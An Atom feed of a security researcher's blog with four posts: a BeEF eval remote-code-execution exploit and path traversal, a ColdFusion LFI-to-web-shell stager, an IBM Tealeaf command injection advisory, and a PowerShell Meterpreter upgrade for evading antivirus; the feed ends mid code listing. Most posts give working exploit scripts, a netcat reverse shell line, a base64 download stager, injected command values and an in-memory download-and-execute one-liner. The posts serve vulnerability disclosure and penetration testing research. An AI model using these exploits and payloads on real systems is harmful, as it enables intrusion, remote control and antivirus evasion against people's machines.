<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[forelsec]]></title>
  <link href="http://hatRiot.github.io/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2014-06-24T21:45:23-06:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[rce in browser exploitation framework (BeEF)]]></title>
    <link href="http://hatRiot.github.io/blog/2014/05/13/rce-in-browser-exploitation-framework-beef/"/>
    <updated>2014-05-13T20:57:53-06:00</updated>
    <id>http://hatRiot.github.io/blog/2014/05/13/rce-in-browser-exploitation-framework-beef</id>
    <content type="html"><![CDATA[<p>Let me preface this post by saying that this vulnerability is <em>already fixed</em>, and was caught pretty early during the development process.  The vulnerability was originally introduced during a merge for the new DNS extension, and was promptly <a href="https://github.com/beefproject/beef/commit/39e672f4207aa46c4c0c11e0ce21cbaa3ab45d71">patched</a> by antisnatchor on 03022014.  Although this vulnerability was caught fairly quickly, it still made it into the master branch.  I post this only because I&rsquo;ve seen too many penetration testers leaving their tools externally exposed, often with default credentials.</p>

<p>The vulnerability is a trivial one, but is capable of returning a reverse shell to an attacker.  BeEF exposes a REST API for modules and scripts to use; useful for dumping statistics, pinging hooked browsers, and more.  It&rsquo;s quite powerful.   This can be accessed by simply pinging <code>http://127.0.0.1:3000/api/</code> and providing a valid token.  This token is static across a single session, and can be obtained by sending a POST to <code>http://127.0.0.1:3000/api/admin/login</code> with appropriate credentials.  Default credentials are beef:beef, and I don&rsquo;t know many users that change this right away.  It&rsquo;s also of interest to note that the throttling code does not exist in the API login routine, so a brute force attack is possible here.</p>

<p>The vulnerability lies in one of the exposed API functions, <code>/rule</code>.  The code for this was as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Adds a new DNS rule
</span><span class='line'>        post '/rule' do
</span><span class='line'>          begin
</span><span class='line'>            body = JSON.parse(request.body.read)
</span><span class='line'>
</span><span class='line'>            pattern = body['pattern']
</span><span class='line'>            type = body['type']
</span><span class='line'>            response = body['response']
</span><span class='line'>
</span><span class='line'>            # Validate required JSON keys
</span><span class='line'>            unless [pattern, type, response].include?(nil)
</span><span class='line'>              # Determine whether 'pattern' is a String or Regexp
</span><span class='line'>              begin
</span><span class='line'>
</span><span class='line'>                pattern_test = eval pattern
</span><span class='line'>                pattern = pattern_test if pattern_test.class == Regexp
</span><span class='line'>   #             end
</span><span class='line'>              rescue =&gt; e;
</span><span class='line'>              end</span></code></pre></td></tr></table></div></figure>


<p>The obvious flaw is the eval on user-provided data.  We can exploit this by POSTing a new DNS rule with a malicious pattern:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import requests
</span><span class='line'>import json
</span><span class='line'>import sys
</span><span class='line'>
</span><span class='line'>def fetch_default(ip):
</span><span class='line'>    url = 'http://%s:3000/api/admin/login' % ip
</span><span class='line'>    headers = { 'Content-Type' : 'application/json; charset=UTF-8' }
</span><span class='line'>    data = { 'username' : 'beef', 'password' : 'beef' }
</span><span class='line'>
</span><span class='line'>    response = requests.post(url, headers=headers, data=json.dumps(data))
</span><span class='line'>    if response.status_code is 200 and json.loads(response.content)['success']:
</span><span class='line'>        return json.loads(response.content)['token']
</span><span class='line'>
</span><span class='line'>try:
</span><span class='line'>    ip = '192.168.1.6'
</span><span class='line'>
</span><span class='line'>    if len(sys.argv) &gt; 1:
</span><span class='line'>        token = sys.argv[1]
</span><span class='line'>    else:
</span><span class='line'>        token = fetch_default(ip)
</span><span class='line'>
</span><span class='line'>    if not token:
</span><span class='line'>        print 'Could not get auth token'
</span><span class='line'>        sys.exit(1)
</span><span class='line'>
</span><span class='line'>    url = 'http://%s:3000/api/dns/rule?token=%s' % (ip, token)
</span><span class='line'>    sploit = '%x(nc 192.168.1.97 4455 -e /bin/bash)'
</span><span class='line'>
</span><span class='line'>    headers = { 'Content-Type' : 'application/json; charset=UTF-8' }
</span><span class='line'>    data = { 'pattern' : sploit,
</span><span class='line'>             'type' : 'A',
</span><span class='line'>             'response' : [ '127.0.0.1' ]
</span><span class='line'>           }
</span><span class='line'>
</span><span class='line'>    response = requests.post(url, headers=headers, data=json.dumps(data))
</span><span class='line'>    print response.status_code
</span><span class='line'>except Exception, e:
</span><span class='line'>    print e
</span></code></pre></td></tr></table></div></figure>


<p>You could execute ruby to grab a shell, but BeEF restricts some of the functions we can use (such as exec or system).</p>

<p>There&rsquo;s also an instance of LFI, this time using the server API.  <code>/api/server/bind</code> allows us to mount files at the root of the BeEF web server.  The path defaults to the current path, but can be traversed out of:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>def run_lfi(ip, token):
</span><span class='line'>    url = 'http://%s:3000/api/server/bind?token=%s' % (ip, token)
</span><span class='line'>    headers = { 'Content-Type' : 'application/json'}
</span><span class='line'>    data = { 'mount' : "/tmp.txt",
</span><span class='line'>             'local_file' : "/../../../etc/passwd"
</span><span class='line'>           }
</span><span class='line'>
</span><span class='line'>    response = requests.post(url, headers=headers, data=json.dumps(data))
</span><span class='line'>    print response.status_code</span></code></pre></td></tr></table></div></figure>


<p>We can then hit our server at /tmp.txt for <code>/etc/passwd</code>.  Though this appears to be intended behavior, and perhaps labeling it an LFI is a misnomer, it is still yet another example of why you should <em>not</em> expose these tools externally with default credentials.  Default credentials are just bad, period.  Stop it.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFI to shell in Coldfusion 6-10]]></title>
    <link href="http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/"/>
    <updated>2014-04-02T15:10:04-06:00</updated>
    <id>http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion</id>
    <content type="html"><![CDATA[<p>ColdFusion has <a href="http://www.blackhatlibrary.net/Coldfusion_hacking">several</a> very popular LFI&rsquo;s that are often used to fetch CF hashes, which can then be passed or cracked/reversed.  A lesser use of this LFI, one that I haven&rsquo;t seen documented as of yet, is actually obtaining a shell.  When you can&rsquo;t crack or pass, what&rsquo;s left?</p>

<p>The less-than-obvious solution is to exploit CFML&rsquo;s parser, which acts much in the same way that PHP does when used in HTML.  You can embed PHP into any HTML page, at any location, because of the way the PHP interpreter searches a document for executable code.  This is the foundational basis of log poisoning.  CFML acts in much the same way, and we can use these LFI&rsquo;s to inject CFML and execute it on the remote system.</p>

<p>Let&rsquo;s begin by first identifying the LFI; I&rsquo;ll be using ColdFusion 8 as example.  CF8&rsquo;s LFI lies in the locale parameter:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.219:8500/CFIDE/administrator/enter.cfm?local=../../../../../../../../ColdFusion8\logs\application.log%00en</span></code></pre></td></tr></table></div></figure>


<p>When exploited, this will dump the contents of <code>application.log</code>, a logging file that stores error messages.</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/cf_log.jpg"></p>

<p>We can write to this file by triggering an error, such as attempting to access a nonexistent CFML page.  This log also fails to sanitize data, allowing us to inject any sort of characters we want; including CFML code.</p>

<p>The idea for this is to inject a simple stager payload that will then pull down and store our real payload; in this case, a web shell (something like fuze).  The stager I came up with is as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfhttp method='get' url='#ToString(ToBinary('aHR0cDovLzE5Mi4xNjguMS45Nzo4MDAwL2NtZC5jZm1s'))#' path='#ExpandPath(ToString(ToBinary('Li4vLi4v')))#' file='cmd.cfml'&gt;</span></code></pre></td></tr></table></div></figure>


<p>The <code>cfhttp</code> tag is used to execute an HTTP request for our real payload, the URL of which is base64&rsquo;d to avoid some encoding issues with forward slashes.  We then expand the local path to <code>../../</code> which drops us into <code>wwwroot</code>, which is the first directory accessible from the web server.</p>

<p>Once the stager is injected, we only need to exploit the LFI to retrieve the log file and execute our CFML code:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/cf_log_fetch.jpg"></p>

<p>Which we can then access from the root directory:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/cf_log_exec.jpg"></p>

<p>A quick run of this in clusterd:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i 192.168.1.219 -a coldfusion -p8500 -v8 --deployer lfi_stager --deploy ./src/lib/resources/cmd.cfml 
</span><span class='line'>
</span><span class='line'>        clusterd/0.2.1 - clustered attack toolkit
</span><span class='line'>            [Supporting 5 platforms]
</span><span class='line'>
</span><span class='line'> [2014-04-02 11:28PM] Started at 2014-04-02 11:28PM
</span><span class='line'> [2014-04-02 11:28PM] Servers' OS hinted at windows
</span><span class='line'> [2014-04-02 11:28PM] Fingerprinting host '192.168.1.219'
</span><span class='line'> [2014-04-02 11:28PM] Server hinted at 'coldfusion'
</span><span class='line'> [2014-04-02 11:28PM] Checking coldfusion version 8.0 ColdFusion Manager...
</span><span class='line'> [2014-04-02 11:28PM] Matched 1 fingerprints for service coldfusion
</span><span class='line'> [2014-04-02 11:28PM]   ColdFusion Manager (version 8.0)
</span><span class='line'> [2014-04-02 11:28PM] Fingerprinting completed.
</span><span class='line'> [2014-04-02 11:28PM] Injecting stager...
</span><span class='line'> [2014-04-02 11:28PM] Waiting for remote server to download file [7s]]
</span><span class='line'> [2014-04-02 11:28PM] cmd.cfml deployed at /cmd.cfml
</span><span class='line'> [2014-04-02 11:28PM] Finished at 2014-04-02 11:28PM
</span></code></pre></td></tr></table></div></figure>


<p>The downside to this method is remnance in a log file, which cannot be purged unless the CF server is shutdown (except in CF10).  It also means that the CFML file, if using the web shell, will be hanging around the filesystem.  An alternative is to inject a web shell that exists on-demand, that is, check if an argument is provided to the LFI and only parse and execute then.</p>

<p>A working deployer for this can be found in the latest release of clusterd (v0.2.1).  It is also worth noting that this method is applicable to other CFML engines; details on that, and a working proof of concept, in the near future.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[IBM Tealeaf CX (v8 Release 8) Remote OS Command Injection / LFI]]></title>
    <link href="http://hatRiot.github.io/blog/2014/03/26/ibm-tealeaf-cx-remote-os-command-injection-lfi/"/>
    <updated>2014-03-26T23:51:11-06:00</updated>
    <id>http://hatRiot.github.io/blog/2014/03/26/ibm-tealeaf-cx-remote-os-command-injection-lfi</id>
    <content type="html"><![CDATA[<p>Tealeaf Technologies was <a href="http://techcrunch.com/2012/05/02/ibm-acquires-tealeaf-to-add-customer-buying-analytics-to-smarter-commerce-products/">purchased</a> by IBM in May of 2012, and is a customer buying analytics application.  Essentially, an administrator will configure a Tealeaf server that accepts analytic data from remote servers, which it then generates various models, graphs, reports, etc based on the aggregate of data.
Their analytics status/server monitoring application is vulnerable to a fairly trivial OS command injection vulnerability, as well as local file inclusion.  This vulnerability was discovered on a PCI engagement against a large retailer; the LFI was used to pull PHP files and hunt for RCE.</p>

<p>The entire application is served up by default on port 8080 and is developed in PHP.  Authentication by default is disabled, however, support for Basic Auth appears to exist.  This interface allows administrators access to statistics, logs, participating servers, and more.  Contained therein is the ability to obtain application logs, such as configuration, maintenance, access, and more.  The log parameter is vulnerable to LFI:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if(array_key_exists("log", $params))
</span><span class='line'>$path = $config-&gt;logfiledir() . "/" . $params["log"];
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>$file = basename($path);
</span><span class='line'>$size = filesize($path);
</span><span class='line'>
</span><span class='line'>// Set the cache-control and expiration date so that the file expires
</span><span class='line'>// immediately after download.
</span><span class='line'>//
</span><span class='line'>$rfc1123date = gmdate('D, d M Y H:i:s T', 1);
</span><span class='line'>header('Cache-Control: max-age=0, must-revalidate, post-check=0, pre-check=0');
</span><span class='line'>header("Expires: " . $rfc1123date);
</span><span class='line'>
</span><span class='line'>header("Content-Type: application/octet-stream");
</span><span class='line'>header("Content-Disposition: attachment; filename=$file;");
</span><span class='line'>header("Content-Length: $size;");
</span><span class='line'>
</span><span class='line'>readfile($path);</span></code></pre></td></tr></table></div></figure>


<p>The URL then is <code>http://host:8080/download.php?log=../../../etc/passwd</code></p>

<p>Tealeaf also suffers from a rather trivial remote OS command injection vulnerability.  Under the Delivery tab, there exists the option to ping remote servers that send data back to the mothership.  Do you see where this is going?</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if ($_POST["perform_action"] == "testconn") {
</span><span class='line'>    $host = $_POST["testconn_host"];
</span><span class='line'>    $port = $_POST["testconn_port"];
</span><span class='line'>    $use_t = strtolower($_POST["testconn_t"]) == "true" ? true : false;
</span><span class='line'>    $command = $GLOBALS["config"]-&gt;testconn_program() . ' ';
</span><span class='line'>    if($use_t)
</span><span class='line'>    $output = trim(shell_command_output($command . $host . " -p " . $port . " -t"));
</span><span class='line'>    else
</span><span class='line'>    $output = trim(shell_command_output($command . $host . " -p " . $port));
</span><span class='line'>
</span><span class='line'>    if($output != "") {
</span><span class='line'>        $alert_function = "alert('" . str_replace("\n", "\\n",
</span><span class='line'>        htmlentities($output, ENT_QUOTES)) . "')";
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    $_SESSION['delivery']-&gt;pending_changes = $orig_pending_changes;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>And shell_command_output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function shell_command_output($command) {
</span><span class='line'>    $result = `$command 2&gt;&1`;
</span><span class='line'>    if (strlen($result) &gt; 0)
</span><span class='line'>    return $result;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Harnessing the <code>$host</code> variable, we can inject arbitrary commands to run under the context of the process user, which by default is <code>ctccap</code>.  In order to exploit this without hanging processes or goofing up flow, I injected the following as the host variable: <code>8.8.8.8 -c 1 ; whoami ; ping 8.8.8.8 -c 1</code>.</p>

<h3>Timeline</h3>


<ul>
<li>11/08/2013: IBM vulnerability submitted</li>
<li>11/09/2013: IBM acknowledge vulnerability and assign internal advisory ID</li>
<li>12/05/2013: Request for status update</li>
<li>01/06/2014: Second request for status update</li>
<li>01/23/2014: IBM responds with a target patch date set for &ldquo;another few months&rdquo;</li>
<li>03/26/2014: IBM posts advisory, assigns CVE-2013-6719 and CVE-2013-6720</li>
</ul>


<p><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21667630">Advisory</a><br/>
<a href="http://www.exploit-db.com/exploits/32546/">exploit-db PoC</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[meterpreter shell upgrades using powershell]]></title>
    <link href="http://hatRiot.github.io/blog/2014/03/10/meterpreter-shell-upgrades-using-powershell/"/>
    <updated>2014-03-10T22:31:47-06:00</updated>
    <id>http://hatRiot.github.io/blog/2014/03/10/meterpreter-shell-upgrades-using-powershell</id>
    <content type="html"><![CDATA[<p>One of my primary goals during development of <a href="https://github.com/hatRiot/clusterd">clusterd</a> was ensuring reliability and covertness during remote deploys.  It&rsquo;s no secret that antivirus routinely eats vanilla meterpreter shells.  For this, the <code>--gen-payload</code> flag generates a war file with <code>java/jsp_shell_reverse_tcp</code> tucked inside.  This is used due to it being largely undetected by AV, and our environments are perfectly suited for it.  However, Meterpreter is a fantastic piece of software, and it&rsquo;d be nice to be able to elevate from this simple JSP shell into it.</p>

<p>Metasploit has a solution for this, sort of.  <code>sessions -u</code> can be used to upgrade an existing shell session into a full-blown Meterpreter.  Unfortunately, the current implementation uses <code>Rex::Exploitation::CmdStagerVBS</code>, which writes the executable to disk and executes it.  This is almost always immediately popped by most enterprise-grade (and even most consumer grade) AV&rsquo;s.  For this, we need a new solution.</p>

<p>The easiest solution is Powershell; this allows us to execute shellcode completely in-memory, without ever bouncing files against disk.  I used Obscure Security&rsquo;s canonical <a href="http://obscuresecurity.blogspot.com/2013/03/powersploit-metasploit-shells.html">post</a> on it for my implementation.  The only problem really is portability, as Powershell doesn&rsquo;t exist on Windows XP.  This could be mitigated by patching in shellcode via Java, but that&rsquo;s another post for another time.</p>

<p>Right, so how&rsquo;s this work?  We essentially execute a Powershell command in the running session (our generic shell) that fetches a payload from a remote server and executes it.  Our payload in this case is <a href="https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1">Invoke-Shellcode</a>, from the PowerSploit package.  This bit of code will generate our reverse HTTPS meterpreter shell and inject it into the current process ID.  Our command looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc %s"</span></code></pre></td></tr></table></div></figure>


<p>Our encoded payload is:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>iex (New-Object Net.WebClient).DownloadString('http://%s:%s/')</span></code></pre></td></tr></table></div></figure>


<p>IEX, or Invoke-Expression, is just an eval operation.  In this case, we&rsquo;re fetching a URL and executing it.  This is a totally transparent, completely in-memory solution.  Let&rsquo;s have a look at it running:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(handler) &gt; sessions -l
</span><span class='line'>
</span><span class='line'>Active sessions
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>  Id  Type         Information                                                                       Connection
</span><span class='line'>  --  ----         -----------                                                                       ----------
</span><span class='line'>  1   shell linux  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  192.168.1.6:4444 -&gt; 192.168.1.102:60911 (192.168.1.102)
</span><span class='line'>
</span><span class='line'>msf exploit(handler) &gt; </span></code></pre></td></tr></table></div></figure>


<p>We see above that we currently have a generic shell (it&rsquo;s the java/jsp_shell_reverse_tcp payload) on a Windows 7 system (which happens to be running MSE).  Using this new script, we can upgrade this session to Meterpreter:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(handler) &gt; sessions -u 1
</span><span class='line'>
</span><span class='line'>[*] Started HTTPS reverse handler on https://0.0.0.0:53568/
</span><span class='line'>[*] Starting the payload handler...
</span><span class='line'>[*] 192.168.1.102:60922 Request received for /INITM...
</span><span class='line'>[*] 192.168.1.102:60922 Staging connection for target /INITM received...
</span><span class='line'>[*] Patched user-agent at offset 663128...
</span><span class='line'>[*] Patched transport at offset 662792...
</span><span class='line'>[*] Patched URL at offset 662856...
</span><span class='line'>[*] Patched Expiration Timeout at offset 663728...
</span><span class='line'>[*] Patched Communication Timeout at offset 663732...
</span><span class='line'>[*] Meterpreter session 2 opened (192.168.1.6:53568 -&gt; 192.168.1.102:60922) at 2014-03-11 23:09:36 -0600
</span><span class='line'>msf exploit(handler) &gt; sessions -i 2
</span><span class='line'>[*] Starting interaction with 2...
</span><span class='line'>
</span><span class='line'>meterpreter &gt; sysinfo
</span><span class='line'>Computer        : BRYAN-PC
</span><span class='line'>OS              : Windows 7 (Build 7601, Service Pack 1).
</span><span class='line'>Architecture    : x64 (Current Process is WOW64)
</span><span class='line'>System Language : en_US
</span><span class='line'>Meterpreter     : x86/win32
</span><span class='line'>meterpreter &gt; </span></code></pre></td></tr></table></div></figure>


<p>And just like that, without a peep from MSE, we&rsquo;ve got a Meterpreter shell.</p>

<p>You can find the code for this implementation below, though be warned; this is PoC quality code, and probably even worse as I&rsquo;m not really a Ruby developer.  Meatballs over at Metasploit has a few awesome Powershell pull requests waiting for a merge.  Once this is done, I can implement that here and submit a proper implementation.  If you&rsquo;d like to try this out, simply create a backup copy of <code>scripts/shell/spawn_meterpreter.rb</code> and copy in the following, then <code>reload</code>.  You should be upgradin&#8217; and bypassin&#8217; in no time.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
